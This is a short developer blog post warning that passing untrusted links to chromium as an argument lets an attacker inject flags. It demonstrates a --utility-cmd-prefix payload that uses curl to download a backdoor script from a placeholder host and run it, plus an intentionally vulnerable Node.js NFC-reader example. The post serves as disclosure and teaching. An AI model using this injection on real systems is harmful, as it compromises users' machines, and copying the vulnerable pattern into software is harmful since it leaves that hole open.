---
layout: post
title:  "Do not run chrome from your app!"
published: true
author: nemanjan00
image: /assets/chrome_malware_warnings.jpg
hero_image: /assets/chrome_malware_warnings.jpg
hero_darken: true
show_sidebar: true
---

This is example how your user can be hacked if you misuse chromium to open web links.

## Attack

What I have seen people do is something like this:

```c
url = "someurl"; // this is just pseudo-code
execlp("chromium", "chromium", url);
```

What that does is it runs this:

```bash
chromium someurl
```

And if they get something like this as parameter:

```
url = `--utility-cmd-prefix='bash -c \" ls . ; curl http://someserver/backdoor.sh > backdoor.sh ; bash backdoor.sh ; ls . \"'`
```

What happens is user just got compromised...

```
chromium --utility-cmd-prefix='bash -c \" ls . ; curl http://someserver/backdoor.sh > backdoor.sh ; bash backdoor.sh ; ls . \"'
```

```javascript
const { spawn } = require("child_process");
const fs = require("fs");

spawn("nfc-mfultralight", ["r", "dump"]).on("close", () => {
	const ndefLibrary = require('ndef-lib');

	const data = fs.readFileSync("./dump").slice(18);

	const message = new ndefLibrary.NdefMessage.fromByteArray(data);

	const url = Buffer.from(message._records[0]._payload).toString("utf8").slice(2);

	const shell = spawn("chromium", [url]);

	shell.stdout.on("data", data => {
		console.log("" + data);
	});

	shell.stderr.on("data", data => {
		console.error("" + data);
	});

	shell.on("close", (code) => {
		console.log(code);
	});
});
```

To understand how big of issue this is I suggest reading [my post about command arguments](https://nemanja.top/2022/05/01/why-argv-sucks-for-users).

## Real danger example 1 (NFC/QRcode)

Now imagine you have just implemented NFC or QRcode reader...

You did not check url format, you passed it to chromium as url...

![](/assets/rfid.png)

## Real danger example 2 (RSS reader/Mail client)

What happens if you want to open link you just took from XML or JSON and you trust it is valid link?

You just pass it to chromium?

